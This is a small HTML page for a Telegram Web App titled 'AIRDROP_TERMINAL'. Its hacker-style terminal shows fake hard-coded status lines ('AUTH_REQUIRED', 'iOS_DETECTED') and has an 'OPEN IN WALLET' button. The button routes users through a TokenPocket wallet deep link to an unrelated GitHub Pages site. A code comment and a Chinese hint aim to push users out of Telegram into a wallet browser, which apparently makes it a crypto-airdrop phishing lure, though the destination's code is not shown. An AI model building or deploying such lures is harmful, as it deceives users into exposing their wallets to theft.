<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AIRDROP_TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #f00; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        #terminal { width: 85%; border: 1px solid #f00; padding: 20px; background: #100; box-shadow: 0 0 15px #f00; }
        .btn {
            display: block; width: 220px; padding: 20px; margin-top: 30px;
            background: #f00; color: #000; text-align: center;
            text-decoration: none; font-weight: bold; border-radius: 5px;
        }
        .hint { color: #555; font-size: 10px; margin-top: 20px; text-align: center; }
    </style>
</head>
<body>

    <div id="terminal">
        <h2>> AUTH_REQUIRED</h2>
        <p>> DEVICE: iOS_DETECTED</p>
        <p id="status">> STATUS: READY_TO_OPEN_WALLET</p>
    </div>

    <a href="https://tokenpocket.github.io/tp-url-common/index.html?url=https://patrickdafhao-code.github.io/cook/" 
       class="btn" 
       id="jumpBtn">
        OPEN IN WALLET
    </a>

    <div class="hint">
        * 若点击无反应，请点右上角 [...] 选择 "在浏览器打开"
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        document.getElementById('jumpBtn').addEventListener('click', function(e) {
            tg.HapticFeedback.notificationOccurred('success');
            // 强制使用 Telegram SDK 的打开功能，增加“跳出”概率
            tg.openLink(this.href, { try_browser: true });
        });
    </script>
</body>
</html>
